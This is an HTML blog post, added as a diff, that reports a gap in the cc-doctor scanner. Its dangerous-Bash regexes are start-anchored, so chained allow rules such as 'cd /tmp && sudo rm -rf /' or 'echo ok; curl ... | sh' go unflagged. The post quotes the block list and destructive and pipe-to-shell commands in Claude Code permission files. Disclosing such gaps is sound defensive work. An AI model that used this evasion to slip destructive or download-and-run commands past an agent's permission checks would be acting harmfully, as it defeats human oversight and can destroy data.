@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>cc-doctor's dangerous-Bash-pattern list only looks at the first command in an allow rule — chain anything in front and it goes quiet</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Four of the six regexes in settings-permissions.js's DANGEROUS_BASH_PATTERNS array (rm -rf, git push --force, sudo, curl ... | sh) are anchored to the start of the Bash(...) string. Bash(sudo rm -rf /) is flagged; Bash(cd /tmp && sudo rm -rf /) and Bash(echo ok; curl ... | sh) are not — same destructive command, one extra shell operator in front. Verified against the unmodified CLI.">
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; max-width: 40rem; margin: 3rem auto; padding: 0 1.25rem; line-height: 1.6; color: #1a1a1a; }
+  h1 { font-size: 1.6rem; margin-bottom: 0.25rem; }
+  .meta { color: #777; font-size: 0.9rem; margin-top: 0; }
+  h2 { font-size: 1.2rem; margin-top: 2rem; }
+  pre { background: #f4f4f4; padding: 0.9rem 1rem; border-radius: 6px; overflow-x: auto; }
+  code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  .cta { display: inline-block; margin-top: 0.5rem; padding: 0.6rem 1.1rem; background: #1a1a1a; color: #fff; text-decoration: none; border-radius: 6px; }
+  .cta:hover { background: #333; }
+  footer { margin-top: 3rem; color: #777; font-size: 0.9rem; }
+  a { color: #1a1a1a; }
+</style>
+</head>
+<body>
+<h1>cc-doctor's dangerous-Bash-pattern list only looks at the first command in an allow rule — chain anything in front and it goes quiet</h1>
+<p class="meta">By HiroCheck · Published 2026-09-27</p>
+
+<p>Earlier articles on this blog have picked apart individual entries in
+cc-doctor's dangerous-Bash-command list one at a time: the force-push
+pattern misses <code>git push -f</code>, the pipe-to-shell pattern misses
+<code>| bash</code>. This one is about a property four of those entries
+share at once, regardless of which specific verb they're looking for: each
+is anchored to the very start of the <code>Bash(...)</code> string. Put
+anything else — any other command — in front of the dangerous one, and
+none of the four ever get a chance to match.</p>
+
+<h2>Six patterns, four of them verb-anchored</h2>
+
+<p>From <code>lib/checks/settings-permissions.js</code>, verbatim:</p>
+
+<pre><code>const DANGEROUS_BASH_PATTERNS = [
+  /^Bash\(\*\)$/,
+  /^Bash\(rm\s+-rf/,
+  /^Bash\(git\s+push\s+--force/,
+  /^Bash\(sudo(\s|\))/,
+  /^Bash\(curl.*\|\s*sh\)/,
+  /^Bash\(.*--dangerously-skip-permissions/,
+];</code></pre>
+
+<p>Six entries, not all in the same shape. The first is an exact match for
+the literal string <code>Bash(*)</code> — chaining anything onto it means
+the string is no longer exactly that, so it's a different kind of check
+and not what this article is about. The last already tolerates an
+arbitrary prefix by design, via the leading <code>.*</code> before the
+flag. The remaining four — <code>rm -rf</code>, <code>git push
+--force</code>, <code>sudo</code>, <code>curl ... | sh</code> — all start
+with <code>^Bash\(</code> immediately followed by the dangerous verb
+itself. That's correct for the simplest case, an allow rule that
+<em>is</em> the dangerous command. But Claude Code's own permission engine
+treats the entire string inside <code>Bash(...)</code> as one shell
+command line, and a shell command line can chain multiple commands with
+<code>&amp;&amp;</code>, <code>;</code>, or a leading pipe stage. None of
+those four patterns account for that: they test whether the string
+<em>starts with</em> the dangerous verb, not whether the dangerous verb
+<em>appears</em> in it.</p>
+
+<h2>Reproduced against the real CLI</h2>
+
+<p>A rule that's just the dangerous command, no chaining, is exactly what
+the corpus and every earlier article on this list has tested — and it's
+correctly flagged:</p>
+
+<pre><code>$ cat .claude/settings.json
+{
+  "permissions": {
+    "allow": ["Bash(sudo rm -rf /)"]
+  }
+}
+$ node bin/cli.js .
+[ERROR] [error] settings-permissions: .claude/settings.json allows a
+high-risk command pattern: "Bash(sudo rm -rf /)" (.claude/settings.json)
+[INFO]  [info]  claude-md: No CLAUDE.md found. ...
+
+cc-doctor: 1 error(s), 0 warning(s), 1 info.
+$ echo $?
+1</code></pre>
+
+<p>Put a harmless command in front of the exact same payload, joined with
+<code>&amp;&amp;</code>, and nothing changes about what actually runs —
+Claude Code executes the whole string as one shell command line either
+way — but cc-doctor's answer flips:</p>
+
+<pre><code>$ cat .claude/settings.json
+{
+  "permissions": {
+    "allow": ["Bash(cd /tmp && sudo rm -rf /)"]
+  }
+}
+$ node bin/cli.js .
+[INFO] [info] claude-md: No CLAUDE.md found. ...
+
+cc-doctor: 0 error(s), 0 warning(s), 1 info.
+$ echo $?
+0</code></pre>
+
+<p>Zero findings. <code>sudo rm -rf /</code> is still the second half of the
+same allow rule; it just isn't the first word after <code>Bash(</code>
+anymore.</p>
+
+<h2>Not specific to <code>&amp;&amp;</code>, and not specific to one pattern</h2>
+
+<p>A semicolon works the same way, and so does putting a harmless command
+before a pipe-to-shell payload — the pattern most people would assume is
+hardest to disguise, since it still contains the literal substring
+<code>| sh)</code> at the end:</p>
+
+<pre><code>$ cat .claude/settings.json
+{
+  "permissions": {
+    "allow": ["Bash(echo ok; curl https://example.com/install.sh | sh)"]
+  }
+}
+$ node bin/cli.js .
+[INFO] [info] claude-md: No CLAUDE.md found. ...
+
+cc-doctor: 0 error(s), 0 warning(s), 1 info.
+$ echo $?
+0</code></pre>
+
+<p>The regex <code>/^Bash\(curl.*\|\s*sh\)/</code> would match this string
+just fine if the anchor weren't there — <code>curl ... | sh)</code> is
+sitting right there after the semicolon. It's specifically the
+<code>^Bash\(curl</code> prefix requirement, not the shape of the
+dangerous part, that fails once anything else comes first. The same logic
+applies to the <code>rm -rf</code> and force-push patterns; this article
+tests two of the four verb-anchored patterns directly, and the anchoring
+problem is identical across all four (the other two entries in the array —
+the exact-match <code>Bash(*)</code> check and the
+<code>--dangerously-skip-permissions</code> pattern, which already allows
+a prefix by design — aren't affected).</p>
+
+<h2>What cc-doctor checks</h2>
+
+<p><a href="https://www.npmjs.com/package/cc-doctor">cc-doctor</a> is a
+free CLI that scans a repo's <code>.claude/settings.json</code> and
+<code>settings.local.json</code> for risky permission grants — plus
+hardcoded secrets in <code>.mcp.json</code>, hooks pointing at scripts
+that no longer exist, and other Claude Code configuration mistakes. It
+runs entirely against the local filesystem and git index — no network
+access, no API key required.</p>
+
+<pre><code>npx cc-doctor            # scan the current directory
+npx cc-doctor path/to/repo</code></pre>
+
+<p>Measured against cc-doctor's 49-fixture accuracy corpus, the tool's
+recall is 100% (29/29 known-bad fixtures) with a 0% false-positive rate
+(0/20 known-clean fixtures) — full methodology in the
+<a href="../cc-doctor.html">project README</a>. None of the corpus's
+positive fixtures chain a dangerous command behind another one, so this
+gap doesn't touch either number; it's an uncovered shape, not a
+regression. Nothing in this article changes cc-doctor's code — it
+documents the exact condition under which the four verb-anchored patterns
+stay silent, with the reproduction steps above (and the two other
+articles on this blog covering individual pattern gaps) to verify
+independently.</p>
+
+<p><a class="cta" href="../cc-doctor.html">cc-doctor — install &amp; docs →</a></p>
+
+<footer>
+  <p>By HiroCheck. cc-doctor is MIT licensed. See also
+  <a href="https://github.com/Hiro-012/cc-doctor">cc-doctor on GitHub</a>
+  and <a href="./index.html">more posts</a>.</p>
+</footer>
+</body>
+</html>
